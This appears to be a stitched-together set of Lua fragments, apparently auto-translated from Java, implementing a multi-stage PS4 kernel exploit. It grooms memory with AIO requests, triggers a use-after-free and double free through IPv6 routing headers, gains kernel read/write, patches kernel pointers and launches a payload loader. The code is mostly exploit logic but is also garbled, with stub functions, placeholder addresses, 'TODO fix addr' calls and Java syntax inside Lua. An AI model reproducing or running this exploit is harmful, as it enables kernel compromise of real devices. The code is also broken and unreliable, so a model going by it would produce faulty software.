            Helper.aioSubmitCmd(cmd, leakReqs:address(), numElems, Helper.AIO_PRIORITY_HIGH, leakIds:address() + ((j-1) * step))
            Helper.setRthdr(sockets[j], wbuf, rsize)
        end

        -- Out of bound read on adjacent malloc 0x80 memory
        Helper.getRthdr(sd, buf, bufLen)

        local sdIdx = -1
        reqs2Off = -1
        fakeReqs3Off = -1

        -- Search starting from 0x80, not 0
        for off = 0x80, bufLen - 0x80, 0x80 do
            -- Check for reqs2 with correct command
            if reqs2Off == -1 and verifyReqs2(buf, off, Helper.AIO_CMD_WRITE) then
                reqs2Off = off
            end

            -- Check for fake reqs3
            if fakeReqs3Off == -1 then
                local marker = buf:getInt(off + 4)
                if marker == markerVal then
                    fakeReqs3Off = off
                    sdIdx = buf:getInt(off + 8)
                end
            end
        end

        if reqs2Off ~= -1 and fakeReqs3Off ~= -1 then
            if sdIdx > 0 and sdIdx <= #sockets then
                fakeReqs3Sd = sockets[sdIdx]

                table.remove(sockets, sdIdx)
                table.insert(sockets, Helper.createUdpSocket())

                Helper.freeRthdrs(sockets)
                break
            end
        end

        -- Free AIOs before next attempt
        Helper.freeAios(leakIds:address(), leakIdsLen, false)
    end

    if reqs2Off == -1 or fakeReqs3Off == -1 then
        error("Could not leak reqs2 and fake reqs3")
    end


    Helper.getRthdr(sd, buf, bufLen)


    for i = 0, 0x80 - 16, 16 do
        local sb = ""
        sb = sb .. Helper.toHexString(i, 8)
        sb = sb .. ": "
        for j = 0, 15 do
            if (i + j) < 0x80 then
                local byteVal = buf:getByte(reqs2Off + i + j) & 0xff
                sb = sb .. Helper.toHexString(byteVal, 2)
            end
        end
```

```lua
Helper = Helper or {}

-- FILE: Main.java
local api = require("socket")
local Helper = {}
Helper.api = api

Helper.PAGE_SIZE = 4096
Helper.AIO_CMD_READ = 0x1
Helper.AIO_CMD_WRITE = 0x2
Helper.AIO_CMD_FLAG_MULTI = 0x40000000
Helper.AIO_PRIORITY_HIGH = 1
Helper.MAX_AIO_IDS = 32
Helper.AIO_STATE_COMPLETE = 0
Helper.AIO_STATE_ABORTED = 4
Helper.IPPROTO_IPV6 = 41
Helper.IPV6_2292PKTOPTIONS = 25
Helper.SOL_SOCKET = 1
Helper.SO_NETIF_BIND = 0x83

Helper.SCE_KERNEL_ERROR_ESRCH = 3

Helper.SYS_socket = 198
Helper.SYS_setsockopt = 203
Helper.SYS_close = 20
Helper.SYS_free = 11
Helper.SYS_mmap = 477
Helper.SYS_munmap = 73
Helper.SYS_aio_submit = 371
Helper.SYS_aio_multi_poll = 980
Helper.SYS_aio_multi_cancel = 981
Helper.SYS_aio_multi_delete = 982
Helper.SYS_getrlimit = 194
Helper.SYS_setrlimit = 195
Helper.SYS_thr_self = 536

Helper.RLIMIT_NOFILE = 7

local syscallWrappers = {
    "socket", "setsockopt", "close", "free", "mmap", "munmap", "aio_submit",
    "aio_multi_poll", "aio_multi_cancel", "aio_multi_delete", "getrlimit", "setrlimit",
    "thr_self"
}

function Helper.syscall(number, ...)
    local args = {...}
    return Helper.api.call(syscallWrappers[number + 1], table.unpack(args))
end

local evf
local sockets = {}
local socketsAlt = {}
local targetId
local reqs1Addr
local fakeReqs3Addr

local NUM_SDS = 8
local NUM_ALIAS = 256
local NUM_CLOBBERS = 256

local kbufAddr = 0x414141410000
local fakeReqs3Off = 0x4000
local reqs3Offset = 0x8000

Helper.AIO_ERRORS = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}

local KernelOffset = {}
KernelOffset.PS4_OFF_TCLASS = 0x40 -- Replace with actual value
KernelOffset.PS4_INPCB_FLAGS2 = 0x48 -- Replace with actual value
KernelOffset.PS4_SO_RCV = 0x98 -- Replace with actual value
KernelOffset.PS4_SO_SND = 0xA0 -- Replace with actual value
KernelOffset.PS4_OFF_FIRST_MBUF = 0x50 -- Replace with actual value
KernelOffset.PS4_OFF_NEXT_MBUF = 0x8 -- Replace with actual value
KernelOffset.PS4_OFF_DATA_MBUF = 0x70 -- Replace with actual value

local function makeAliasedPktopts(altSds)
    local sd1, sd2 = -1, -1

    for i = 1, #altSds do
        if altSds[i] > 0 then
            if sd1 == -1 then
                sd1 = altSds[i]
            elseif sd2 == -1 then
                sd2 = altSds[i]
                break
            end
        end
    end

    if sd1 == -1 or sd2 == -1 then
        return nil
    end

    return {sd1, sd2}
end

-- FILE: Exploit.java
-- Assuming Buffer class is defined elsewhere or is replaced with a suitable Lua equivalent
local function execute()
    local success = Helper.executeStage1()
    if not success then
        print("Stage 1 failed")
        return
    end

    local success = Helper.executeStage2()
    if not success then
        print("Stage 2 failed")
        return
    end

    local sdPair = Helper.executeStage3(sockets[1])
    if sdPair == nil then
        print("Stage 3 failed")
        return
    end

    -- Assuming k100Addr and kernelAddr are obtained somehow
    local k100Addr = 0x1234567890
    local kernelAddr = 0x9876543210

    success = Helper.executeStage4(sdPair, k100Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)
    if not success then
        print("Stage 4 failed")
        return
    end

    print("Exploit completed successfully")
end

-- STAGE 1: Prepare memory layout
function Helper.executeStage1()
    local sock = Helper.syscall(Helper.SYS_socket, 2, 1, 0)
    sockets[1] = sock

    if sock < 0 then
        return false
    end

    local val = 1
    local buffer = {val}
    local bufferAddr = ffi.cast("void*", buffer) -- Assuming 'ffi' library is available and 'buffer' is a C-compatible Lua table
    local bufferSize = ffi.sizeof(buffer[1]) -- Assuming ffi.sizeof works similarly to Java's sizeof

    local ret = Helper.syscall(Helper.SYS_setsockopt, sock, Helper.SOL_SOCKET, Helper.SO_NETIF_BIND, bufferAddr, bufferSize)

    if ret < 0 then
        return false
    end

    evf = Helper.syscall(Helper.SYS_socket, 31, 1, 4)

    if evf < 0 then
        return false
    end

    for i = 1, NUM_SDS do
        local sock = Helper.syscall(Helper.SYS_socket, 2, 1, 0)
        sockets[i] = sock

        if sock < 0 then
            return false
        end

        local val = 1
        local buffer = {val}
        local bufferAddr = ffi.cast("void*", buffer) -- Assuming 'ffi' library is available and 'buffer' is a C-compatible Lua table
        local bufferSize = ffi.sizeof(buffer[1]) -- Assuming ffi.sizeof works similarly to Java's sizeof

        local ret = Helper.syscall(Helper.SYS_setsockopt, sock, Helper.SOL_SOCKET, Helper.SO_NETIF_BIND, bufferAddr, bufferSize)

        if ret < 0 then
            return false
        end

        local altSock = Helper.syscall(Helper.SYS_socket, 2, 1, 0)
        socketsAlt[i] = altSock

        if altSock < 0 then
            return false
        end
    end

    return true
end

-- STAGE 2: UAF on rthdr
function Helper.executeStage2()
    local numElems = Helper.MAX_AIO_IDS
    local aioReqs = Helper.createAioRequests(numElems)

    local numBatches = 0x20
    local leakIdsLen = numBatches * numElems
    local leakIds = {}
    for i = 1, leakIdsLen do leakIds[i] = 0 end

    local bufLen = 0x100
    local buf = {}
    for i = 1, bufLen do buf[i] = 0 end

    local sd = sockets[1]

    for i = 1, numBatches do
        local currentIds = {}
        for j = 1, numElems do
            currentIds[j] = i * 1000 + j
        end

        Helper.aioSubmitCmd(Helper.AIO_CMD_READ, aioReqs, numElems, Helper.AIO_PRIORITY_HIGH, currentIds)

        for j = 1, numElems do
            leakIds[(i - 1) * numElems + j] = currentIds[j]
        end
    end

    for i = 1, NUM_ALIAS do
        for j = 1, NUM_SDS do
            if sockets[j] > 0 then
                Helper.setRthdr(sockets[j], buf, bufLen)
            end
        end

        local reqs2Size = 0x80
        local reqs2 = {}
        for k = 1, reqs2Size do reqs2[k] = 0 end

        local rsize = Helper.buildRoutingHeader(reqs2, reqs2Size)

        reqs2[5] = 5  -- .ar2_ticket

        local reqs2Off = 0

        local sb = ""
        for i = 1, bufLen do
            sb = sb .. string.format("%02X", buf[i])
            if i % 16 == 0 then
                sb = sb .. "\n"
            else
                sb = sb .. " "
            end
        end

        aioInfoAddr = buf[0x18+1] -- index +1 for lua

        reqs1Addr = buf[0x10+1]
        reqs1Addr = bit.band(reqs1Addr, bit.bnot(0xff))

        fakeReqs3Addr = kbufAddr + fakeReqs3Off + reqs3Offset

        targetId = -1
        local toCancel = -1
        local toCancelLen = -1

        for i = 1, leakIdsLen, numElems do
            --Helper.aioMultiCancel(leakIds.address() + i*4, numElems, Helper.AIO_ERRORS.address()) --TODO fix addr
            Helper.getRthdr(sd, buf, bufLen)

            local state = buf[reqs2Off + 0x38 + 1]
            if state == Helper.AIO_STATE_ABORTED then
                targetId = leakIds[i]
                leakIds[i] = 0

                local start = i + numElems
                toCancel = i * 4 --TODO fix addr
                toCancelLen = leakIdsLen - start

                break
            end
        end

        if targetId == -1 then
            error("Target id not found")
        end

        Helper.cancelAios(toCancel, toCancelLen)
        --Helper.freeAios(leakIds.address(), leakIdsLen, false) --TODO fix addr

        return true

    end

    return false
end

-- STAGE 3: Double free reqs1
function Helper.executeStage3(aliasedSd)
    local maxLeakLen = (0xff + 1) * 8
    local buf = {}
    for i = 1, maxLeakLen do buf[i] = 0 end

    local numElems = Helper.MAX_AIO_IDS
    local aioReqs = Helper.createAioRequests(numElems)

    local numBatches = 2
    local aioIdsLen = numBatches * numElems
    local aioIds = {}
    for i = 1, 4 * aioIdsLen do aioIds[i] = 0 end

    local aioNotFound = true

    --Helper.freeEvf(evf) --TODO FIX
    Helper.syscall(Helper.SYS_close, evf)

    for i = 1, NUM_CLOBBERS do
        Helper.sprayAio(numBatches, aioReqs, numElems, aioIds, true, Helper.AIO_CMD_READ)

        local sizeRet = Helper.getRthdr(aliasedSd, buf, maxLeakLen)
        local cmd = buf[1]

        if sizeRet == 8 and cmd == Helper.AIO_CMD_READ then
            aioNotFound = false
            Helper.cancelAios(0, aioIdsLen) --TODO FIX
            break
        end

        --Helper.freeAios(aioIds.address(), aioIdsLen, true) --TODO FIX
    end

    if aioNotFound then
        return nil
    end

    local reqs2Size = 0x80
    local reqs2 = {}
    for i = 1, reqs2Size do reqs2[i] = 0 end

    local rsize = Helper.buildRoutingHeader(reqs2, reqs2Size)

    reqs2[5] = 5  -- .ar2_ticket
    reqs2[0x18 + 1] = reqs1Addr  -- .ar2_info
    reqs2[0x20 + 1] = fakeReqs3Addr  -- .ar2_batch

    local states = {}
    for i = 1, 4 * numElems do states[i] = 0 end
    local addrCache = {}
    for i = 1, numBatches do
        addrCache[i] = 0 + (i - 1) * numElems * 4 --TODO fix addr
    end

    Helper.syscall(Helper.SYS_CLOSE, aliasedSd)

    local reqId = Helper.overwriteAioEntryWithRthdr(sockets, reqs2, rsize, addrCache, numElems, states, 0) --TODO fix addr

    if reqId == -1 then
        return nil
    end

    --Helper.freeAios(aioIds.address(), aioIdsLen, false) --TODO fix addr

    local targetIdBuf = {}
    for i = 1, 4 do targetIdBuf[i] = 0 end
    targetIdBuf[1] = targetId

    --Helper.aioMultiPoll(targetIdBuf.address(), 1, states.address()) --TODO fix addr
    Helper.aioMultiPoll(0, 1, 0) --TODO fix addr

    local pktoptsFreed = 0
    for i = 1, #socketsAlt do
        if socketsAlt[i] > 0 then
            local success, err = pcall(function()
                local tempBuf = {}
                for i = 1, 1 do tempBuf[i] = 0 end
                Helper.setSockOpt(socketsAlt[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, tempBuf, 0)
                pktoptsFreed = pktoptsFreed + 1
            end)
        end
    end

    local sceErrs = {}
    for i = 1, 8 do sceErrs[i] = 0 end
    sceErrs[1] = -1
    sceErrs[5] = -1

    local targetIds = {}
    for i = 1, 8 do targetIds[i] = 0 end
    targetIds[1] = reqId
    targetIds[5] = targetId

    --Helper.aioMultiDelete(targetIds.address(), 2, sceErrs.address()) --TODO fix addr
    Helper.aioMultiDelete(0, 2, 0) --TODO fix addr

    local sdPair = nil
    local success, err = pcall(function()
        sdPair = makeAliasedPktopts(socketsAlt)
    end)

    local err1 = sceErrs[1]
    local err2 = sceErrs[5]

    states[1] = -1
    states[5] = -1

    --Helper.aioMultiPoll(targetIds.address(), 2, states.address()) --TODO fix addr
    Helper.aioMultiPoll(0, 2, 0) --TODO fix addr

    if states[1] ~= Helper.SCE_KERNEL_ERROR_ESRCH then
        return nil
    end
    if err1 ~= 0 or err1 ~= err2 then
        return nil
    end

    if sdPair == nil then
        return nil
    end

    return sdPair
end

local function sprayAio(loops, reqs1, numReqs, ids, multi, cmd)
    if cmd == 0 then cmd = Helper.AIO_CMD_READ end

    local step = 4 * (multi and numReqs or 1)
    cmd = bit.bor(cmd, multi and Helper.AIO_CMD_FLAG_MULTI or 0)

    for i = 1, loops do
        local currentIds = ids + (i - 1) * step --TODO fix addr
        Helper.aioSubmitCmd(cmd, reqs1, numReqs, Helper.AIO_PRIORITY_HIGH, currentIds)
    end
end

local function overwriteAioEntryWithRthdr(sds, reqs2, rsize, addrCache, numElems, states, aioIdsBase)
    for i = 1, NUM_ALIAS do
        local rthdrsSet = 0
        for j = 1, NUM_SDS do
            if sds[j] > 0 then
                Helper.setRthdr(sds[j], reqs2, rsize)
                rthdrsSet = rthdrsSet + 1
            end
        end

        if rthdrsSet == 0 then
            break
        end

        for batch = 1, #addrCache do
            local batchJava = batch - 1

            local success, err = pcall(function()
                for j = 1, numElems do
                    states[j*4 + 1] = -1
                end

                --Helper.aioMultiCancel(addrCache[batchJava], numElems, states.address()) --TODO fix addr
                Helper.aioMultiCancel(0, numElems, 0) --TODO fix addr

                local reqIdx = -1
                for j = 1, numElems do
                    local val = states[j * 4 + 1]
                    if val == Helper.AIO_STATE_COMPLETE then
                        reqIdx = j
                        break
                    end
                end

                if reqIdx ~= -1 then
                    local aioIdx = (batch - 1) * numElems + reqIdx
                    local reqIdP = aioIdsBase + (aioIdx - 1) * 4 --index problem?
                    local reqId = api.read32(reqIdP)
                    --Helper.aioMultiPoll(reqIdP, 1, states.address()) --TODO fix addr
                    Helper.aioMultiPoll(0, 1, 0) --TODO fix addr
                    api.write32(reqIdP, 0)

                    return reqId
                end
            end)
        end
    end

    return -1
end

-- STAGE 4: Get arbitrary kernel read/write
function Helper.executeStage4(pktoptsSds, k100Addr, kernelAddr, sds, sdsAlt, aioInfoAddr)
    local masterSock = pktoptsSds[1]
    local tclass = {}
    for i = 1, 4 do tclass[i] = 0 end
    local offTclass = KernelOffset.PS4_OFF_TCLASS

    local pktoptsSize = 0x100
    local pktopts = {}
    for i = 1, pktoptsSize do pktopts[i] = 0 end
    local rsize = Helper.buildRoutingHeader(pktopts, pktoptsSize)
    local pktinfoP = k100Addr + 0x10

    -- pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    pktopts[0x10 + 1] = pktinfoP

    local reclaimSock = -1
end

function Helper.buildRoutingHeader(reqs2, reqs2Size)
end

function Helper.setRthdr(socketsj, buf, bufLen)
end

function Helper.aioSubmitCmd(cmd, aioReqs, numElems, aioPriorityHigh, currentIds)
end

function Helper.createAioRequests(numElems)
end

function Helper.cancelAios(toCancel, toCancelLen)
end

function Helper.freeAios(address, leakIdsLen, b)
end

function Helper.getRthdr(sd, buf, bufLen)
    return 8
end

function Helper.setSockOpt(sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buffer, i)
end

function Helper.aioMultiDelete(address, i, address0)
end

function Helper.aioMultiPoll(address, i, address0)
end
```

```lua
Helper = Helper or {}
Kernel = Kernel or {}
NativeInvoke = NativeInvoke or {}

function Exploit.exploit(pktoptsSds, sds, sdsAlt, masterSock, pktinfoP, kernelAddr, aioInfoAddr, rsize)
    local reclaimSock = -1
    local tclass = Buffer.new(4)
    local offTclass = 0x8

    Helper.syscall(Helper.SYS_CLOSE, pktoptsSds[1])

    for i = 1, NUM_ALIAS do
        for j = 0, #sdsAlt - 1 do
            if sdsAlt[j + 1] >= 0 then
                local marker = 0x4141 | ((j + 1) << 16)
                pktopts:putInt(offTclass, marker)
                Helper.setRthdr(sdsAlt[j + 1], pktopts, rsize)
            end
        end

        Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4)
        local marker = tclass:getInt(0)
        if (marker & 0xffff) == 0x4141 then
            local idx = (marker >>> 16) - 1
            if idx >= 0 and idx < #sdsAlt then
                reclaimSock = sdsAlt[idx + 1]
                Helper.removeSocketFromArray(sdsAlt, idx + 1)
                break
            end
        end
    end

    if reclaimSock == -1 then
        return false
    end

    local pktinfoLen = 0x14
    local pktinfo = Buffer.new(pktinfoLen)
    pktinfo:putLong(0, pktinfoP)

    local readBuf = Buffer.new(8)

    -- Slow kernel read implementation

    -- Test read the "evf cv" string
    local testValue = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, kernelAddr)
    local testStr = Helper.extractStringFromBuffer(readBuf)

    if testStr ~= "evf cv" then
        return false
    end

    -- Find curproc from previously freed aio_info using correct offset
    local curproc = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, aioInfoAddr + 8)

    if (curproc >>> 48) ~= 0xffff then
        return false
    end

    -- Verify curproc by checking PID with correct offset
    local possiblePid = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_PID)
    local currentPid = Helper.syscall(Helper.SYS_GETPID)

    if (possiblePid & 0xffffffff) ~= currentPid then
        return false
    end

    -- Store kernel addresses
    Kernel.addr.curproc = curproc
    Kernel.addr.insideKdata = kernelAddr

    -- Use slow kernel read for address resolution
    local curprocFd = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_FD)
    local curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curprocFd) + KernelOffset.FILEDESC_OFILES

    -- Create worker socket for fast R/W
    local workerSock = Helper.createUdpSocket()
    local workerPktinfo = Buffer.new(pktinfoLen)

    -- Create pktopts on worker_sock
    Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, workerPktinfo, pktinfoLen)

    -- Get worker socket's pktopts address using slow read
    local workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, workerSock, curprocOfiles)
    local workerPcb = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerFdData + KernelOffset.SO_PCB)
    local workerPktopts = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerPcb + KernelOffset.INPCB_PKTOPTS)

    -- Initialize fast kernel R/W
    kernelRW = Kernel.KernelRW(masterSock, workerSock, curprocOfiles)
    kernelRW:setupPktinfo(workerPktopts)

    Kernel.setKernelAddresses(curproc, curprocOfiles, kernelAddr, 0)

    -- Fix corrupt pointers
    local offIp6poRthdr = KernelOffset.PS4_OFF_IP6PO_RTHDR

    -- Fix rthdr pointers for all sockets
    for i = 0, #sds - 1 do
        if sds[i + 1] >= 0 then
            local sockPktopts = kernelRW:getSockPktopts(sds[i + 1])
            kernelRW:kwrite8(sockPktopts + offIp6poRthdr, 0)
        end
    end

    local reclaimerPktopts = kernelRW:getSockPktopts(reclaimSock)
    kernelRW:kwrite8(reclaimerPktopts + offIp6poRthdr, 0)

    local workerPktoptsAddr = kernelRW:getSockPktopts(workerSock)
    kernelRW:kwrite8(workerPktoptsAddr + offIp6poRthdr, 0)

    -- Increase ref counts - only for sockets we actually have
    local sockIncreaseRef = {masterSock, workerSock, reclaimSock}

    for i = 0, #sockIncreaseRef - 1 do
        local sockAddr = kernelRW:getFdDataAddr(sockIncreaseRef[i + 1])
        kernelRW:kwrite32(sockAddr + 0x0, 0x100)  -- so_count
    end

    return true
end

-- Cleanup function
function Exploit.cleanup()
    xpcall(function()
        -- Close socketpair
        if blockFd >= 0 then
            Helper.syscall(Helper.SYS_CLOSE, blockFd)
            blockFd = -1
        end
        if unblockFd >= 0 then
            Helper.syscall(Helper.SYS_CLOSE, unblockFd)
            unblockFd = -1
        end

        -- Free grooming AIOs
        if groomIds then
            local errors = Buffer.new(4 * Helper.MAX_AIO_IDS)

            for i = 0, NUM_GROOMS - 1, Helper.MAX_AIO_IDS do
                local batchSize = math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i)
                local batchIds = Buffer.new(4 * batchSize)

                for j = 0, batchSize - 1 do
                    batchIds:putInt(j * 4, groomIds[i + j + 1])
                end

                -- Poll and delete (no cancel - free_aios2 pattern)
                Helper.aioMultiPoll(batchIds:address(), batchSize, errors:address())
                Helper.aioMultiDelete(batchIds:address(), batchSize, errors:address())
            end
            groomIds = nil
        end

        -- Unblock and delete blocking AIO
        if blockId >= 0 then
            local blockIdBuf = Buffer.new(4)
            blockIdBuf:putInt(0, blockId)
            local blockErrors = Buffer.new(4)

            Helper.aioMultiWait(blockIdBuf:address(), 1, blockErrors:address(), 1, 0)
            Helper.aioMultiDelete(blockIdBuf:address(), 1, blockErrors:address())
            blockId = -1
        end

        -- Close sockets
        if sockets then
            for i = 0, #sockets - 1 do
                if sockets[i + 1] >= 0 then
                    Helper.syscall(Helper.SYS_CLOSE, sockets[i + 1])
                    sockets[i + 1] = -1
                end
            end
            sockets = nil
        end

        -- Close socketsAlt
        if socketsAlt then
            for i = 0, #socketsAlt - 1 do
                if socketsAlt[i + 1] >= 0 then
                    Helper.syscall(Helper.SYS_CLOSE, socketsAlt[i + 1])
                    socketsAlt[i + 1] = -1
                end
            end
            socketsAlt = nil
        end

        -- Restore previous core
        if previousCore >= 0 then
            Helper.pinToCore(previousCore)
            previousCore = -1
        end

        -- Reset kernel state
        if Kernel.addr then
            Kernel.addr:reset()
        end
        kernelRW = nil

    end, function(e)
        print("Error during cleanup:", e)
    end)
end

function Exploit.main(cons)
    console = cons
    local status, err = xpcall(function()
        Exploit.initializeExploit()

        if Helper.isJailbroken() then
            NativeInvoke.sendNotificationRequest("Already Jailbroken")
            return 0
        end

        if not Exploit.performSetup() then
            Exploit.cleanup()
            return -3
        end

        -- Create socketsAlt for stages
        socketsAlt = {}
        for i = 0, NUM_SDS_ALT - 1 do
            socketsAlt[i + 1] = Helper.createUdpSocket()
        end

        local aliasedPair = Exploit.executeStage1()
```

            if (aliasedPair == nil) then
                Poops.cleanup()
                return -4
            end
            
            if (not Poops.executeStage2(aliasedPair)) then
                Poops.cleanup()
                return -5
            end
            
            local pktoptsSds = Poops.executeStage3(aliasedPair[1])
            if (pktoptsSds == nil) then
                Poops.cleanup()
                return -6
            end
            Helper.syscall(Helper.SYS_CLOSE, fakeReqs3Sd)
            
            if (not Poops.executeStage4(pktoptsSds, reqs1Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)) then
                Poops.cleanup()
                return -7
            end
            
            if (not Kernel.postExploitationPS4()) then
                Poops.cleanup()
                return -8
            end
            
            Poops.cleanup()
            BinLoader.start()
            return 0
            
        catch = function(e)
            Poops.cleanup()
        end
        return -10
    end,
}

-- FILE: HenLoader/src/org/bdj/external/Poops.java
Poops = {
    -- constants
    AF_UNIX = 1,
    AF_INET6 = 28,
    SOCK_STREAM = 1,
    IPPROTO_IPV6 = 41,

    IPV6_RTHDR = 51,
    IPV6_RTHDR_TYPE_0 = 0,
    UCRED_SIZE = 0x168,
    MSG_HDR_SIZE = 0x30,
    UIO_IOV_NUM = 0x14,
    MSG_IOV_NUM = 0x17,
    IOV_SIZE = 0x10,

    IPV6_SOCK_NUM = 128,
    TWIN_TRIES = 15000,
    UAF_TRIES = 50000,
    KQUEUE_TRIES = 300000,
    IOV_THREAD_NUM = 4,
    UIO_THREAD_NUM = 4,
    PIPEBUF_SIZE = 0x18,

    COMMAND_UIO_READ = 0,
    COMMAND_UIO_WRITE = 1,
    PAGE_SIZE = 0x4000,
    FILEDESCENT_SIZE = 0x8,

    UIO_READ = 0,
    UIO_WRITE = 1,
    UIO_SYSSPACE = 1,

    NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003,
    NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007,
    RTHDR_TAG = 0x13370000,

    SOL_SOCKET = 0xffff,
    SO_SNDBUF = 0x1001,

    F_SETFL = 4,
    O_NONBLOCK = 4,

    -- system methods
    dup = nil,
    close = nil,
    read = nil,
    readv = nil,
    write = nil,
    writev = nil,
    ioctl = nil,
    fcntl = nil,
    pipe = nil,
    kqueue = nil,
    socket = nil,
    socketpair = nil,
    recvmsg = nil,
    getsockopt = nil,
    setsockopt = nil,
    setuid = nil,
    getpid = nil,
    sched_yield = nil,
    cpuset_setaffinity = nil,
    __sys_netcontrol = nil,

    -- ploit data
    leakRthdr = Buffer.new(UCRED_SIZE),
    leakRthdrLen = Int32.new(),
    sprayRthdr = Buffer.new(UCRED_SIZE),
    msg = Buffer.new(MSG_HDR_SIZE),
    sprayRthdrLen = nil,
    msgIov = Buffer.new(MSG_IOV_NUM * IOV_SIZE),
    dummyBuffer = Buffer.new(0x1000),
    tmp = Buffer.new(PAGE_SIZE),
    victimPipebuf = Buffer.new(PIPEBUF_SIZE),
    uioIovRead = Buffer.new(UIO_IOV_NUM * IOV_SIZE),
    uioIovWrite = Buffer.new(UIO_IOV_NUM * IOV_SIZE),

    uioSs = Int32Array.new(2),
    iovSs = Int32Array.new(2),

    iovThreads = {},
    uioThreads = {},

    iovState = nil,
    uioState = nil,

    uafSock = nil,

    uioSs0 = nil,
    uioSs1 = nil,

    iovSs0 = nil,
    iovSs1 = nil,

    kl_lock = nil,
    kq_fdp = nil,
    fdt_ofiles = nil,
    allproc = nil,

    twins = {},
    triplets = {},
    ipv6Socks = {},

    masterPipeFd = Int32Array.new(2),
    victimPipeFd = Int32Array.new(2),

    masterRpipeFd = nil,
    masterWpipeFd = nil,
    victimRpipeFd = nil,
    victimWpipeFd = nil,

    -- misc data
    previousCore = -1,

    kernelRW = nil,

    console = nil,

    kBase = nil,

    api = nil,

    -- sys methods
    dup_func = function(fd)
        return Helper.api.call(Poops.dup, fd)
    end,

    close_func = function(fd)
        return Helper.api.call(Poops.close, fd)
    end,

    read_func = function(fd, buf, nbytes)
        return Helper.api.call(Poops.read, fd, buf ~= nil and buf:address() or 0, nbytes)
    end,

    readv_func = function(fd, iov, iovcnt)
        return Helper.api.call(Poops.readv, fd, iov ~= nil and iov:address() or 0, iovcnt)
    end,

    write_func = function(fd, buf, nbytes)
        return Helper.api.call(Poops.write, fd, buf ~= nil and buf:address() or 0, nbytes)
    end,

    writev_func = function(fd, iov, iovcnt)
        return Helper.api.call(Poops.writev, fd, iov ~= nil and iov:address() or 0, iovcnt)
    end,

    ioctl_func = function(fd, request, arg0)
        return Helper.api.call(Poops.ioctl, fd, request, arg0)
    end,

    fcntl_func = function(fd, cmd, arg0)
        return Helper.api.call(Poops.fcntl, fd, cmd, arg0)
    end,

    pipe_func = function(fildes)
        return Helper.api.call(Poops.pipe, fildes ~= nil and fildes:address() or 0)
    end,

    kqueue_func = function()
        return Helper.api.call(Poops.kqueue)
    end,

    socket_func = function(domain, type, protocol)
        return Helper.api.call(Poops.socket, domain, type, protocol)
    end,

    socketpair_func = function(domain, type, protocol, sv)
        return Helper.api.call(Poops.socketpair, domain, type, protocol, sv ~= nil and sv:address() or 0)
    end,

    recvmsg_func = function(s, msg, flags)
        return Helper.api.call(Poops.recvmsg, s, msg ~= nil and msg:address() or 0, flags)
    end,

    getsockopt_func = function(s, level, optname, optval, optlen)
        return Helper.api.call(Poops.getsockopt, s, level, optname, optval ~= nil and optval:address() or 0, optlen ~= nil and optlen:address() or 0)
    end,

    setsockopt_func = function(s, level, optname, optval, optlen)
        return Helper.api.call(Poops.setsockopt, s, level, optname, optval ~= nil and optval:address() or 0, optlen)
    end,

    setuid_func = function(uid)
        return Helper.api.call(Poops.setuid, uid)
    end,

    getpid_func = function()
        return Helper.api.call(Poops.getpid)
    end,


```lua
local Helper = {}

function Helper.syscall(number, ...)
    local args = {...}
    return Helper.api.call(syscallWrappers[number + 1], table.unpack(args))
end

local sched_yield
local __sys_netcontrol
local cpuset_setaffinity
local dup
local close
local read
local write
local socket
local bind
local listen
local accept
local connect
local getsockopt
local setsockopt
local kqueue
local kevent
local mmap
local munmap
local shm_open
local shm_unlink
local ftruncate
local sysctlbyname
local thr_self
local thr_create
local thr_exit
local sigemptyset
local sigaddset
local sigprocmask
local usleep
local getuid
local getgid
local getpid
local getppid
local getcwd

local ipv6Socks = {}
local uioSs1
local uioSs0
local iovSs1
local iovSs0
local iovThreads = {}
local uioThreads = {}
local previousCore = -1
local tmp
local leakRthdr
local uioIovRead
local uioIovWrite
local msgIov
local iovState
local uioState
local leakRthdrLen
local triplets = {}
local api

local AF_INET6
local SOCK_STREAM
local IPPROTO_IPV6
local IPV6_UNICAST_HOPS
local IPV6_V6ONLY
local SOL_SOCKET
local SO_REUSEADDR
local SO_SNDBUF
local SO_RCVBUF
local IPV6_RTHDR
local IPV6_RTHDR_TYPE_0
local CTL_NET
local AF_INET
local IPV6CTL_MRT6PROTO
local IPV6CTL_MRT6STATS
local PF_ROUTE
local NET_RT_IFLIST
local NET_RT_FLAGS
local RTF_UP
local RTF_RUNNING
local RTF_LOOPBACK
local UIO_MAXIOV
local UIO_SYSSPACE
local UIO_READ
local UIO_WRITE
local EVFILT_READ
local EVFILT_WRITE
local EV_ADD
local EV_ENABLE
local EV_CLEAR
local EV_EOF
local NOTE_LOWAT

local IOV_THREAD_NUM
local UIO_THREAD_NUM
local UAF_TRIES
local COMMAND_UIO_READ
local COMMAND_UIO_WRITE

local Int8 = {}
Int8.SIZE = 1

local Int32 = {}
function Int32:new(value)
    local o = {value = value}
    setmetatable(o, self)
    self.__index = self
    return o
end

function Int32:size()
    return 4
end

local Buffer = {}
function Buffer:new(size)
    local o = {data = string.rep("\0", size), size = size}
    setmetatable(o, self)
    self.__index = self
    return o
end

function Buffer:putByte(offset, value)
    local b = string.char(value & 0xFF)
    self.data = self.data:sub(1, offset) .. b .. self.data:sub(offset + 1)
end

function Buffer:putInt(offset, value)
